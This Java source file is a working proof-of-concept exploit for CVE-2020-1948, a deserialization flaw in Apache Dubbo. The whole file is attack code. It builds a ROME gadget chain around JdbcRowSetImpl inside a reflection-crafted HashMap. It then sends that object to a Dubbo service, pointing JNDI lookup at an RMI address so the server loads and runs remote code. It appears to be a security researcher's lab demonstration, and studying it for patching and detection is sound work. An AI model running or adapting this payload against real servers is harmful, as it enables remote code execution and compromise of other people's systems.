/*
 * Licensed to the Apache Software Foundation (ASF) under one or more
 * contributor license agreements.  See the NOTICE file distributed with
 * this work for additional information regarding copyright ownership.
 * The ASF licenses this file to You under the Apache License, Version 2.0
 * (the "License"); you may not use this file except in compliance with
 * the License.  You may obtain a copy of the License at
 *
 *     http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */
package org.example;

import com.rometools.rome.feed.impl.EqualsBean;
import com.rometools.rome.feed.impl.ToStringBean;
import com.sun.rowset.JdbcRowSetImpl;
import org.apache.dubbo.config.annotation.Reference;
import org.example.api.DemoService;
import org.springframework.boot.SpringApplication;
import org.springframework.boot.autoconfigure.EnableAutoConfiguration;
import org.springframework.context.annotation.Bean;

import java.lang.reflect.Array;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.util.HashMap;

/**
 * @author Whoopsunix
 *
 * CVE-2020-1948
 *
 * 2.5.x、[2.6.0, 2.6.7]、[2.7.0, 2.7.6]、2.7.7
 */
@EnableAutoConfiguration
public class CVE_2020_1948 {

    @Reference(version = "1.0", url = "dubbo://127.0.0.1:12345")
    private DemoService demoService;

    public static void main(String[] args) {
        SpringApplication.run(CVE_2020_1948.class).close();
    }

    public static Object romePayload(String jndiUrl) throws Exception{

        JdbcRowSetImpl rs = new JdbcRowSetImpl();
        rs.setDataSourceName(jndiUrl);
        rs.setMatchColumn("foo");
        Field listeners = javax.sql.rowset.BaseRowSet.class.getDeclaredField("listeners");
        listeners.setAccessible(true);
        listeners.set(rs, null);

        ToStringBean item = new ToStringBean(JdbcRowSetImpl.class,
                rs);
        EqualsBean root = new EqualsBean(ToStringBean.class,item);

        HashMap<Object, Object> s = new HashMap<>();
        Field size = s.getClass().getDeclaredField("size");
        size.setAccessible(true);
        size.set(s, 2);
        Class<?> nodeC;
        try {
            nodeC = Class.forName("java.util.HashMap$Node");
        }
        catch ( ClassNotFoundException e ) {
            nodeC = Class.forName("java.util.HashMap$Entry");
        }
        Constructor<?> nodeCons = nodeC.getDeclaredConstructor(int.class, Object.class, Object.class, nodeC);
        nodeCons.setAccessible(true);

        Object tbl = Array.newInstance(nodeC, 2);
        Array.set(tbl, 0, nodeCons.newInstance(0, root, root, null));
        Array.set(tbl, 1, nodeCons.newInstance(0, root, root, null));
        Field table = s.getClass().getDeclaredField("table");
        table.setAccessible(true);
        table.set(s, tbl);

        return s;
    }

    @Bean
    public void runner() throws Exception{
        String result = demoService.sayHello("Whoopsunix");
        System.out.println(result);
        demoService.sayObject(romePayload("rmi://127.0.0.1:1099/tvebfl"));
    }
}
